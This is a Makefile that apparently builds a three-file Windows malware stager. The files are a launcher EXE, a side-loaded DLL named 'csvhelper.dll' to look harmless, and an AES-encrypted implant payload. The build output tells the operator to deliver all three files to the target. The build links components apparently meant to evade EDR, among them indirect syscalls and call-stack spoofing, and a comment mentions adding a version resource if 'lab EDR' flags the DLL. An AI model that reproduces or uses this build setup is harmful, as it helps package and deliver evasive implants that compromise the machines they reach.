# stager Makefile — three-file delivery (launcher.exe + csvhelper.dll + payload.dat)
#
# Usage:
#   make PICO=/path/to/implant.crystal.bin
#   make PICO=/path/to/implant.crystal.bin OUTPUT=/path/to/launcher.exe
#   make PICO=... PLUGIN_NAME=whatever.dll     # override plugin filename
#
# Outputs (all in $(dir OUTPUT)):
#   <OUTPUT>              launcher EXE (~17 KB, no embedded payload)
#   $(PLUGIN_NAME)        slot loader DLL
#   payload.dat           AES-256-CBC encrypted PICO

CC      := x86_64-w64-mingw32-gcc
WINDRES := x86_64-w64-mingw32-windres

PICO        ?= $(error PICO is not set — run: make PICO=/path/to/implant.crystal.bin)
OUTPUT      ?= ../build/stager.exe
PLUGIN_NAME ?= csvhelper.dll
PAYDAT      := $(dir $(OUTPUT))payload.dat
PLUGIN      := $(dir $(OUTPUT))$(PLUGIN_NAME)

# PLUGIN_NAME is the single source of truth: the string flows into the
# launcher's .rdata via -DPLUGIN_NAME and names the emitted DLL artefact —
# they cannot drift.

CFLAGS_COMMON    := -Wall -Os -ffunction-sections -fdata-sections
CFLAGS_LAUNCHER  := $(CFLAGS_COMMON) -mwindows -DPLUGIN_NAME=\"$(PLUGIN_NAME)\"
CFLAGS_PLUGIN    := $(CFLAGS_COMMON)
LDFLAGS_COMMON   := -s -Wl,--gc-sections
LDFLAGS_LAUNCHER := $(LDFLAGS_COMMON) -ladvapi32 -lbcrypt -lntdll
LDFLAGS_PLUGIN   := $(LDFLAGS_COMMON) -shared -Wl,--kill-at

.PHONY: all clean

all: $(OUTPUT) $(PLUGIN)
	@echo ""
	@echo "[+] Deliver ALL THREE files to the target (same directory):"
	@echo "      $(abspath $(OUTPUT))"
	@echo "      $(abspath $(PLUGIN))"
	@echo "      $(abspath $(PAYDAT))"
	@echo "    launcher reads payload.dat and $(PLUGIN_NAME) from its own directory."
	@echo "    Do NOT rename $(PLUGIN_NAME) on target — filename is a compile-time literal."

# ── Step 1: AES-256-CBC encrypt PICO → payload.dat + C key header ─────────
#    gen_payload.py writes both files in one call; track via payload_key.h.
payload_key.h: $(PICO) gen_payload.py
	@mkdir -p "$(dir $(PAYDAT))"
	python3 gen_payload.py "$(abspath $(PICO))" "$(abspath $(PAYDAT))" payload_key.h

# ── Step 2: compile version info resource ─────────────────────────────────
resource.o: resource.rc
	$(WINDRES) resource.rc -o resource.o

# ── Step 3a: link launcher.exe ────────────────────────────────────────────
#    payload_key.h is a launcher-only prerequisite — never a plugin dep, to
#    keep the AES key out of the DLL's .rdata.
$(OUTPUT): launcher.c ghost.c ghost.h payload_key.h resource.o
	@mkdir -p "$(dir $(OUTPUT))"
	$(CC) $(CFLAGS_LAUNCHER) -o "$(abspath $(OUTPUT))" launcher.c ghost.c resource.o $(LDFLAGS_LAUNCHER)

# ── Step 3b: link csvhelper.dll ───────────────────────────────────────────
#    No resource.o (skipped — see design notes; add resource.rc for the DLL
#    only if lab EDR flags on the bare VERSIONINFO absence).
$(PLUGIN): plugin.c spoof.c spoof.h spoof_stub.S hellshall.c hellshall.h
	@mkdir -p "$(dir $(PLUGIN))"
	$(CC) $(CFLAGS_PLUGIN) -o "$(abspath $(PLUGIN))" plugin.c spoof.c spoof_stub.S hellshall.c $(LDFLAGS_PLUGIN)

clean:
	rm -f payload_key.h resource.o
